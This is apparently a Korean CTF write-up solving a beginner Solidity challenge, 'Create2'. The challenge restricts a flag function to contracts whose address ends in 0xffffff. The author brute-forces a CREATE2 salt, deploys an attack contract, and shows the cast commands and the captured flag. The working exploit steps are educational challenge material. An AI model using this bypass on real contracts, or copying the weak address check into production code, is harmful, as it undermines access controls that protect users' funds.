# Beginner: 6. Create2



**Mission**

Using CREATE2 to deploy a smart contract offers advantages beyond just obtaining a pretty address - [contract](https://sepolia.scrollscan.com/address/0x04b8527DCd6b1296EB4b125854B4f47Be56Af2d2)

```solidity
pragma solidity =0.8.27;

contract Create2 {
    mapping(address user => bool hasFlag) public flag;

    modifier onlyContract() {
        require(
            tx.origin != msg.sender && isContract(msg.sender),
            "only contract can call this function"
        );
        _;
    }

    function isContract(address _addr) private view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function buyFlag(address user) external onlyContract {
        require(uint160(msg.sender) & 0xffffff == 0xffffff, "invalid sender");
        flag[user] = true;
    }
}
```

출제의도: create2 사용해보기

풀이:

조건 1: buyFlag함수를 보면 msg.sender와 0xffffff을 &연산했을 때, 0xffffff이 나와야 한다. 즉, msg.sender의 하위 3바이트가 0xffffff이어야 한다는 것이다.

 

조건 2: onlyContract에서 tx.origin과 msg.sender가 다른지, msg.sender의 extcodesize가 0보다 큰지 체크하여 msg.sender가 컨트랙트여야함을 조건으로 강제하고 있다. 

그렇다면 우리는 공격 컨트랙트를 작성해야 하는데, 이 컨트랙트의 주소의 하위 3바이트가 0xffffff이어야 한다는 것이다.

이는 create2를 이용해서 할 수 있는데, create2는 salt값을 조정하여 어느정도 원하는 유형의 주소가 나오도록 bruteforce를 수행할 수 있다.

그러면 우리는 공격 컨트랙트를 작성하고, 해당 컨트랙트의 바이트코드를 구한 후, 이 바이트코드로 create2로 했을 때, 주소의 하위 3바이트가 0xffffff이 되는 salt값을 찾아 create2로 컨트랙트를 deploy하여 문제를 해결하면 된다.

https://solidity-by-example.org/app/create2/

위 링크를 참조하여, 아래와 같이 코드를 작성하자.

```solidity
// This is the older way of doing it using assembly
contract FactoryAssembly {
    event Deployed(address addr, uint256 salt);

    // 1. Get bytecode of contract to be deployed
    // NOTE: _owner and _foo are arguments of the TestContract's constructor
    function getBytecode(address _target)
        public
        pure
        returns (bytes memory)
    {
        bytes memory bytecode = type(Solve).creationCode;

        return abi.encodePacked(bytecode, abi.encode(_target));
    }

    // 2. Compute the address of the contract to be deployed
    // NOTE: _salt is a random number used to create an address
    function getAddress(bytes memory bytecode, uint256 _salt)
        public
        view
        returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff), address(this), _salt, keccak256(bytecode)
            )
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }

    // 3. Deploy the contract
    // NOTE:
    // Check the event log Deployed which contains the address of the deployed TestContract.
    // The address in the log should equal the address computed from above.
    function deploy(bytes memory bytecode, uint256 _salt) public payable {
        address addr;

        /*
        NOTE: How to call create2

        create2(v, p, n, s)
        create new contract with code at memory p to p + n
        and send v wei
        and return the new address
        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))
              s = big-endian 256-bit value
        */
        assembly {
            addr :=
                create2(
                    callvalue(), // wei sent with current call
                    // Actual code starts after skipping the first 32 bytes
                    add(bytecode, 0x20),
                    mload(bytecode), // Load the size of code contained in the first 32 bytes
                    _salt // Salt from function arguments
                )

            if iszero(extcodesize(addr)) { revert(0, 0) }
        }

        emit Deployed(addr, _salt);
    }
}

contract Solve{
	address target;
	constructor(address _target){
		target = _target;
	}

	function exploit() public{
		(bool success, ) = target.call(abi.encodeWithSignature("buyFlag(address)", tx.origin));
		require(success, "Failed...");
	}
}
```

우리는 create2를 이용해 Solve 컨트랙트를 하위 3바이트가 0xffffff이 되도록 deploy할 것이다. 그러면 우선, FactoryAssembly를 deploy한 후, getBytecode로 Solve 컨트랙트의 바이트코드를 구해야 한다.

Deploy FactoryAssembly:

```solidity
forge create FactoryAssembly --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY
```

result:

```solidity
No files changed, compilation skipped
Deployer: 0x4C5F15604c4B63EcBe4DFfA125879e0CC278711b
Deployed to: 0xaC94a5b708A53430bf5A77Bc91e528b0625f9e04
Transaction hash: 0x8233a0755f6804440255c486b8939cadf120fcb7fae2aeb371249a4f06e19c8a
```

그러면 getBytecode를 호출해보자. Solve의 constructor에서 타겟 주소(챌린지 컨트랙트)를 받으므로, 해당 값을 getBytecode의 인자로 넘겨줘야 한다.

getBytecode:

```solidity
cast call 0xaC94a5b708A53430bf5A77Bc91e528b0625f9e04 "getBytecode(address)(bytes)" 0x04b8527DCd6b1296EB4b125854B4f47Be56Af2d2 --rpc-url $SCROLL_RPC_URL
```

result

```solidity
0x6080604052348015600f57600080fd5b50604051610203380380610203833981016040819052602c916050565b600080546001600160a01b0319166001600160a01b0392909216919091179055607e565b600060208284031215606157600080fd5b81516001600160a01b0381168114607757600080fd5b9392505050565b6101768061008d6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806363d9b77014610030575b600080fd5b61003861003a565b005b600080546040513260248201526001600160a01b039091169060440160408051601f198184030181529181526020820180516001600160e01b031663e8ebc47760e01b1790525161008b9190610111565b6000604051808303816000865af19150503d80600081146100c8576040519150601f19603f3d011682016040523d82523d6000602084013e6100cd565b606091505b505090508061010e5760405162461bcd60e51b81526020600482015260096024820152682330b4b632b217171760b91b604482015260640160405180910390fd5b50565b6000825160005b818110156101325760208186018101518583015201610118565b50600092019182525091905056fea264697066735822122027bd36311b26abeeaa64195bb546fd604c2d1abb6bb896ea8938239897d1ae1364736f6c634300081a003300000000000000000000000004b8527dcd6b1296eb4b125854b4f47be56af2d2
```

우리는 위 바이트코드를 create2로 deploy했을 때, 하위 3바이트가 0xffffff이 되도록하는 salt값을 brute force로 구할 것이다. 

FactoryAssembly 컨트랙트의 getAddress함수를 참고하여, 파이썬 코드를 아래와 같이 작성한다.

```python
from web3 import Web3
from eth_abi.packed import encode_packed

# 바이트코드와 배포 주소 설정
bytecode = "0x6080604052348015600f57600080fd5b50604051610203380380610203833981016040819052602c916050565b600080546001600160a01b0319166001600160a01b0392909216919091179055607e565b600060208284031215606157600080fd5b81516001600160a01b0381168114607757600080fd5b9392505050565b6101768061008d6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806363d9b77014610030575b600080fd5b61003861003a565b005b600080546040513260248201526001600160a01b039091169060440160408051601f198184030181529181526020820180516001600160e01b031663e8ebc47760e01b1790525161008b9190610111565b6000604051808303816000865af19150503d80600081146100c8576040519150601f19603f3d011682016040523d82523d6000602084013e6100cd565b606091505b505090508061010e5760405162461bcd60e51b81526020600482015260096024820152682330b4b632b217171760b91b604482015260640160405180910390fd5b50565b6000825160005b818110156101325760208186018101518583015201610118565b50600092019182525091905056fea264697066735822122027bd36311b26abeeaa64195bb546fd604c2d1abb6bb896ea8938239897d1ae1364736f6c634300081a003300000000000000000000000004b8527dcd6b1296eb4b125854b4f47be56af2d2"
deployer_address = "YOU_WALLET_ADDRESS"

# Web3 인스턴스 생성
w3 = Web3()

# 목표 주소의 하위 3바이트
target_suffix = "ffffff"

# 0부터 무한대로 salt를 증가시키며 확인
salt = 0
while True:
    # abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)) 계산
    bytecode_hash = w3.keccak(hexstr=bytecode)
    encoded = encode_packed(
        ['bytes1', 'address', 'uint256', 'bytes32'],
        [b'\xff', deployer_address, salt, bytecode_hash]
    )

    # keccak256 해시 계산
    hash_result = w3.keccak(encoded).hex()

    # 계산된 주소의 하위 3바이트 확인
    contract_address = '0x' + hash_result[-40:]
    if contract_address[-6:] == target_suffix:
        print(f"일치하는 salt 값: {salt}")
        print(f"예상 컨트랙트 주소: {contract_address}")
        break

    # salt 값을 증가
    salt += 1
```

result:

```python
일치하는 salt 값: 6185625
예상 컨트랙트 주소: 0x1af909ba5e38f69689f1910380fcc0c6ffffffff
```

그러면 우리는 해당 salt값을 통해, FactoryAssembly의 deploy 함수를 이용하여, 하위 3바이트가 0xffffff인 주소를 갖는 컨트랙트를 deploy할 수 있게 된다. 

deploy

```solidity
cast send 0xaC94a5b708A53430bf5A77Bc91e528b0625f9e04 "deploy(bytes,uint256)" 0x6080604052348015600f57600080fd5b50604051610203380380610203833981016040819052602c916050565b600080546001600160a01b0319166001600160a01b0392909216919091179055607e565b600060208284031215606157600080fd5b81516001600160a01b0381168114607757600080fd5b9392505050565b6101768061008d6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806363d9b77014610030575b600080fd5b61003861003a565b005b600080546040513260248201526001600160a01b039091169060440160408051601f198184030181529181526020820180516001600160e01b031663e8ebc47760e01b1790525161008b9190610111565b6000604051808303816000865af19150503d80600081146100c8576040519150601f19603f3d011682016040523d82523d6000602084013e6100cd565b606091505b505090508061010e5760405162461bcd60e51b81526020600482015260096024820152682330b4b632b217171760b91b604482015260640160405180910390fd5b50565b6000825160005b818110156101325760208186018101518583015201610118565b50600092019182525091905056fea264697066735822122027bd36311b26abeeaa64195bb546fd604c2d1abb6bb896ea8938239897d1ae1364736f6c634300081a003300000000000000000000000004b8527dcd6b1296eb4b125854b4f47be56af2d2 6185625 --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY

```

Deployed Contract Address:

```solidity
0x1AF909BA5e38F69689F1910380fcc0c6FFFfffff
```

하위 3바이트가 ffffff인 주소로 deploy 된 것을 확인할 수 있다.

그럼 이제 Solve Contract의 exploit함수를 호출해 문제를 해결하자.

exploit:

```solidity
cast send 0x1AF909BA5e38F69689F1910380fcc0c6FFFfffff "exploit()" --rpc-url $SCROLL_RPC_URL --private-key $YOUR_PRIV_KEY
```

Flag:

```solidity
ethcon2024{keccak256(sender,nonce) vs keccak256(256,sender,salt,bytecode)}
```